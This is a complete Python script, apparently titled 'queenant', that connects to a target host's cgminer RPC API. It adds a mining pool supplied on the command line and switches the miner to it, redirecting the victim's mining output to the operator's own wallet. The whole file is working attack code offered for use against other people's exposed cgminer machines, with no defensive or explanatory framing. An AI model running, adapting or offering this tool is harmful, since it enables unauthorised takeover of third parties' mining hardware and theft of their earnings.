#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket, argparse, sys, logging as log
try:
    import simplejson as json
except:
    import json


__author__  = "Tim Noise <tim@drkns.net>"
__version__ = "0.0.1"

RED    = '\033[91m'
YELLOW = '\033[33m'
GREEN  = '\033[32m'
BOLD   = '\033[1m'
END    = '\033[0m'


__doc__ = """{0}{1}
________
\_____  \\  __ __   ____   ____   ____
 /  / \  \|  |  \_/ __ \_/ __ \ /    \\
/   \_/.  \  |  /\  ___/\  ___/|   |  \\
\_____\ \_/____/  \___  >\___  >___|  /
       \__>           \/     \/     \/

       |   /
        \  |
         \_|
     __  /` ;
   `'  \ `\_/ _         minions!
     '-/ \/ '._             bathe,
  /'-./| |.--. `                meee.
 _/  _.-\/--.  |
`   |   /`-. \ '-.
    |   |   | \\
   /    |   /  `-.
 -'     \__/{2}
""".format(RED, BOLD, END)


log.addLevelName(log.DEBUG, "%s[d]%s" % (YELLOW, END))
log.addLevelName(log.INFO,  "%s[+]%s" % (GREEN, END))
log.addLevelName(log.ERROR, "%s[!]%s" % (RED, END))

log.basicConfig(format='%(levelname)s %(message)s', level=log.INFO)


class CgminerAPI(object):
    """ Cgminer RPC API wrapper. """
    def __init__(self, host='localhost', port=4028):
        self.data = {}
        self.host = host
        self.port = port

    def command(self, command, arg=None):
        """ Initialize a socket connection,
        send a command (a json encoded dict) and
        receive the response (and decode it).
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            log.debug("connecting to %s:%d", self.host, self.port)
            sock.connect((self.host, self.port))
        except socket.error, e:
            log.error("unable to connect to %s:%d", self.host, self.port)
            sys.exit(1)

        try:
            payload = {"command": command}
            if arg is not None:
                # Parameter must be converted to basestring (no int)
                payload.update({'parameter': unicode(arg)})

            sock.send(json.dumps(payload))
            received = self._receive(sock)

        finally:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()

        return json.loads(received[:-1])

    def _receive(self, sock, size=4096):
        msg = ''
        while 1:
            chunk = sock.recv(size)
            if chunk:
                msg += chunk
            else:
                break
        return msg

    def __getattr__(self, attr):
        def out(arg=None):
            return self.command(attr, arg)
        return out

if __name__ == "__main__":
    print __doc__

    parser = argparse.ArgumentParser(prog="queenant", description="change cgminer pools to your own",
                    epilog="""./queen.py 10.1.1.2 --port 4028 \\
                            "stratum+tcp://us.clevermining.com:3333" <yourBTCwallet> 123""")

    parser.add_argument("host", help="target IP machaine")
    parser.add_argument("pool", help="new pool host")
    parser.add_argument("pool_user", help="username for new pool")
    parser.add_argument("pool_pass", help="pass for new pool")

    parser.add_argument("--port", type=int, default=4028, help="target port for cgminer rpc")
    # parser.add_argument("--conf", type=str, default="/config/cgminer.conf", help="remote config file (default: /config/cgminer.conf)")

    args = parser.parse_args()

    log.info("connecting to: %s:%d", args.host, args.port)

    cg = CgminerAPI(args.host, args.port)

    # general info
    summary = cg.command('summary')

    log.info("Version: %s", summary['STATUS'][0]['Description'])
    log.info("Average GH/s: %s", summary['SUMMARY'][0]['GHS av'])


    # pool info
    pools = cg.command('pools')['POOLS']

    log.info("Configured Pools: %d", len(pools))

    for k, pool in enumerate(pools):
        log.info("Pool %d", k)
        log.info("\tURL: %s", pool['URL'])
        log.info("\tUsername: %s", pool['User'])

    # add a new pool
    log.info("adding new pool...")

    addpool = cg.command('addpool', "%s,%s,%s" % (args.pool, args.pool_user, args.pool_pass))

    if (addpool['STATUS'][0]['STATUS'] == 'S'):
        new_pool_id = int(addpool['STATUS'][0]['Msg'][11])
        log.info("Success! pool added as pool id %d", new_pool_id)
    else:
        log.error("Failed to add pool, check cgminer/API-README for details")
        log.debug(addpool)
        sys.exit(1)

    # set it to active - this will switch priority to 0
    log.info("switching new pool to active")

    switchpool = cg.command('switchpool', new_pool_id)

    if (switchpool['STATUS'][0]['STATUS'] == 'S'):
        log.info("Success! switched to new pool")
    else:
        log.error("Failed to switch to new pool, check cgminer/API-README for details")
        log.debug(switchpool)
        sys.exit(1)

    # pool info
    log.info("new pool configuration")

    pools = cg.command('pools')['POOLS']

    log.info("Configured Pools: %d", len(pools))

    for k, pool in enumerate(pools):
        log.info("Pool %d", k)
        log.info("\tURL: %s", pool['URL'])
        log.info("\tUsername: %s", pool['User'])

    # that will do for now
